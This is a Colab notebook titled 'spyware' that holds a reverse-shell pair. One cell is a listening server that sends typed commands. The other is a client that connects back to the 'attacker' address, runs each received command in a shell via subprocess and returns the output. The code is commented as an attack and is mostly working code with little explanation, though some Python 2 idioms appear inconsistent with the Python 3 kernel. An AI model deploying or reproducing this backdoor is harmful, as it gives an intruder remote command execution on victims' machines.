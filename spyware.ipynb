{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPs8jk6j6T9rw5l1dIeuSYm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/vvvvvvss/spyware/blob/main/spyware.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "k8yMjjbNXLV7",
        "outputId": "d7ee41fa-c7bd-4aff-c7aa-9912051e6ef3"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting watchdog\n",
            "  Downloading watchdog-5.0.3-py3-none-manylinux2014_x86_64.whl.metadata (41 kB)\n",
            "\u001b[?25l     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.0/41.9 kB\u001b[0m \u001b[31m?\u001b[0m eta \u001b[36m-:--:--\u001b[0m\r\u001b[2K     \u001b[91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[90m╺\u001b[0m \u001b[32m41.0/41.9 kB\u001b[0m \u001b[31m53.9 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m41.9/41.9 kB\u001b[0m \u001b[31m635.1 kB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hRequirement already satisfied: requests in /usr/local/lib/python3.10/dist-packages (2.32.3)\n",
            "Collecting python-dotenv\n",
            "  Downloading python_dotenv-1.0.1-py3-none-any.whl.metadata (23 kB)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests) (3.4.0)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.10/dist-packages (from requests) (3.10)\n",
            "Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/local/lib/python3.10/dist-packages (from requests) (2.2.3)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.10/dist-packages (from requests) (2024.8.30)\n",
            "Downloading watchdog-5.0.3-py3-none-manylinux2014_x86_64.whl (79 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m79.3/79.3 kB\u001b[0m \u001b[31m2.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading python_dotenv-1.0.1-py3-none-any.whl (19 kB)\n",
            "Installing collected packages: watchdog, python-dotenv\n",
            "Successfully installed python-dotenv-1.0.1 watchdog-5.0.3\n"
          ]
        }
      ],
      "source": [
        "pip install watchdog requests python-dotenv"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import socket\n",
        "\n",
        "HOST = '0.0.0.0'  # server will bind to any IP\n",
        "PORT = 12345\n",
        "\n",
        "server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # creates server TCP socket\n",
        "server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # prevents from getting timeout issues\n",
        "server_socket.bind((HOST, PORT))\n",
        "\n",
        "server_socket.listen(5)  # 5 connections max in queue\n",
        "print(\"\\n[*] Listening on port \" +str(PORT)+ \", waiting for connexions.\")\n",
        "\n",
        "# see socket documentation to understand how socket.accept works\n",
        "client_socket, (client_ip, client_port) = server_socket.accept()\n",
        "print(\"[*] Client \" +client_ip+ \" connected.\\n\")\n",
        "\n",
        "\n",
        "while True:\n",
        "    try:\n",
        "        command = raw_input(client_ip+ \">\")\n",
        "        if(len(command.split()) != 0):\n",
        "            client_socket.send(command)\n",
        "        else:\n",
        "            continue\n",
        "    except(EOFError):\n",
        "            print(\"Invalid input, type 'help' to get a list of implemented commands.\\n\")\n",
        "            continue\n",
        "\n",
        "    if(command == \"quit\"):\n",
        "        break\n",
        "\n",
        "    data = client_socket.recv(1024)\n",
        "    print(data + \"\\n\")\n",
        "\n",
        "client_socket.close()\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "DUuS59q5X8as",
        "outputId": "6d8af108-1a44-4cab-c108-51cad23bbadd"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "[*] Listening on port 12345, waiting for connexions.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import socket\n",
        "import subprocess, os\n",
        "\n",
        "HOST = \"localhost\"  # attacker's IP adress (this is a random one, just to show you)\n",
        "PORT = 12345 # attacker's port on which server is listening\n",
        "\n",
        "# same syntax here as for the server\n",
        "connexion_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
        "connexion_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n",
        "connexion_socket.connect((HOST, PORT))\n",
        "print(\"\\n[*] Connected to \" +HOST+ \" on port \" +str(PORT)+ \".\\n\")\n",
        "\n",
        "while True:\n",
        "\n",
        "    command = connexion_socket.recv(1024)\n",
        "    split_command = command.split()\n",
        "    print(\"Received command : \" +command)\n",
        "\n",
        "    # if its quit, then break out and close socket\n",
        "    if command == \"quit\":\n",
        "        break\n",
        "\n",
        "    if(command.split()[0] == \"cd\"):\n",
        "            if len(command.split()) == 1:\n",
        "                connexion_socket.send((os.getcwd()))\n",
        "            elif len(command.split()) == 2:\n",
        "                try:\n",
        "                    os.chdir(command.split()[1])\n",
        "                    connexion_socket.send((\"Changed directory to \" + os.getcwd()))\n",
        "                except(WindowsError):\n",
        "                    connexion_socket.send(str.encode(\"No such directory : \" +os.getcwd()))\n",
        "\n",
        "    else:\n",
        "        # do shell command\n",
        "        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n",
        "        # read output\n",
        "        stdout_value = proc.stdout.read() + proc.stderr.read()\n",
        "        print(stdout_value + \"\\n\")\n",
        "        # send output to attacker\n",
        "        if(stdout_value != \"\"):\n",
        "            connexion_socket.send(stdout_value)  # renvoit l'output  à l'attaquant\n",
        "        else:\n",
        "            connexion_socket.send(command+ \" does not return anything\")\n",
        "\n",
        "\n",
        "connexion_socket.close()\n"
      ],
      "metadata": {
        "id": "W0WTgUXdeAIt"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}